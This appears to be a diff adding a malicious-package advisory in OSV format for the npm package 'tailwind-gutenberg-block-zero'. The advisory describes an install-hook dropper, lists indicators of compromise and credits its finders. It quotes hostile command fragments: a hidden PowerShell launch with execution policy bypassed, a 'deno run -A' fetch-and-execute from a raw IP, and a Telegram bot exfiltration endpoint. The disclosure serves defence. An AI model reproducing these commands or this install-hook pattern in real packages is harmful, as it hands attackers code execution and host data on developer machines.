@@ -1,0 +1,97 @@
+{
+  "schema_version": "1.7.4",
+  "id": "MAL-2026-11044",
+  "published": "2026-07-20T00:00:00Z",
+  "modified": "2026-08-04T21:35:14.054273727Z",
+  "summary": "Malicious code in tailwind-gutenberg-block-zero (npm)",
+  "details": "The npm package `tailwind-gutenberg-block-zero` is a supply-chain dropper disguised as a WordPress / Gutenberg block plugin. The published tarball carries the trappings of a real plugin (a `my-tailwind-blocks.php`, a `wp-scripts` build configuration, a README and a screenshot), but its real behaviour lives in an npm install lifecycle hook.\n\n`package.json` declares `scripts.install = \"node setup.js\"`, so `setup.js` executes automatically on `npm install`, before the package is ever imported. The script fingerprints the host (`os.platform()`, `os.hostname()`), downloads a second-stage payload from the hardcoded raw IP `http://172.94.9.157/v028f8cde892b0b74c8.js` and writes it to disk, then executes it through a hidden, minimised PowerShell process (`child_process.exec(\"start /min powershell ...\")`, alongside a bundled `setup.ps1`) — a Windows-targeted download-and-execute chain. Collected data is exfiltrated to a Telegram bot via `https://api.telegram.org/bot<token>/sendMessage` (the URL was reconstructed from an assembled string; the bot token is withheld).\n\nAny developer workstation or CI runner that installs the package (directly or transitively) hands arbitrary code execution to the operator. Detected and classified independently by codelake Research from the live npm feed on 2026-07-17; at the time of reporting the package was not present in OSV or GHSA (a first-catch).\n\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (dcdb0345912d382c162c8f389cd9b4cecdcad5a0940df166c4ffdc6bbcf2dbff)\npackage.json declares `\"install\": \"node setup.js\"`, so setup.js runs automatically on `npm install`. setup.js writes a PowerShell script to the OS temp directory and launches it with `start /min powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File...` (windowsHide:true, detached:true), then exits within ~500ms to conceal the child process. The staged PowerShell script installs Scoop/winget, installs the Deno runtime, and runs `deno run -A http://172.94.9.157/v028f8cde892b0b74c8.js` — remote, unpinned JavaScript pulled over cleartext HTTP from a bare IP address and executed with Deno's `-A` all-permissions flag, giving arbitrary code full filesystem, network, environment, and subprocess access on the installer's machine. setup.js additionally collects `os.hostname()`, `os.platform()`, `os.arch()`, and a package identifier at install time and POSTs a `[NEW INSTALLATION]` beacon to `api.telegram.org/bot<token>/sendMessage` (bot token and chat id are blanked in this shipped variant but the exfil path is wired). The destination host is not the package's publisher, the runtime install is not the attack surface, and the fetched-and-executed remote JS is attacker-controlled; the cover story of a `CMS Store Hub installation` does not match the shipped behavior.\n",
+  "affected": [
+    {
+      "package": {
+        "name": "tailwind-gutenberg-block-zero",
+        "ecosystem": "npm"
+      },
+      "versions": [
+        "1.0.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "indicators": {
+          "evidence_files": [
+            {
+              "path": "setup.js",
+              "sha256": "58a3cc4580ab8bb5cded5413deb93ed64d0ccd6ee2d531b29cc906c4cf130bf3",
+              "tlsh": "127142c463f5c2e647726fb2b5d1960ae22e80397213d380f4ac41c13fa1969c7a1ddd"
+            }
+          ],
+          "package_integrity": [
+            {
+              "filename": "tailwind-gutenberg-block-zero-1.0.0.tgz",
+              "hashes": {
+                "sha1": "829ef875921dbd354ae870c4c8837420ed2c6c96",
+                "sha512_sri": "sha512-+dYwEzx1g+zC0xBgJfx3uQmXaY3CQd5rPvIjH8M+B+M1kzmpXlV5fZt8vjywD9Xd4Idq1MqgUswqPTXs6uwppA=="
+              }
+            }
+          ]
+        }
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://research.codelake.dev/advisories/clr-2026-3037-tailwind-gutenberg-block-zero"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/tailwind-gutenberg-block-zero/v/1.0.0"
+    }
+  ],
+  "database_specific": {
+    "iocs": {
+      "hashes": [
+        "sha256:335ec20a718179b3ec6e79a97fdea9c6498bf024018989e0bf4109bff4e827e1"
+      ],
+      "ips": [
+        "172.94.9.157"
+      ],
+      "urls": [
+        "http://172.94.9.157/v028f8cde892b0b74c8.js"
+      ]
+    },
+    "malicious-packages-origins": [
+      {
+        "id": "IN-MAL-2026-011054",
+        "import_time": "2026-08-04T21:33:15.227539652Z",
+        "modified_time": "2026-08-04T21:25:54Z",
+        "sha256": "dcdb0345912d382c162c8f389cd9b4cecdcad5a0940df166c4ffdc6bbcf2dbff",
+        "source": "amazon-inspector",
+        "versions": [
+          "1.0.0"
+        ]
+      }
+    ]
+  },
+  "credits": [
+    {
+      "name": "Amazon Inspector",
+      "contact": [
+        "inspector-research@amazon.com"
+      ],
+      "type": "FINDER"
+    },
+    {
+      "name": "codelake Research",
+      "contact": [
+        "https://research.codelake.dev/advisories/clr-2026-3037-tailwind-gutenberg-block-zero"
+      ],
+      "type": "FINDER"
+    }
+  ]
+}
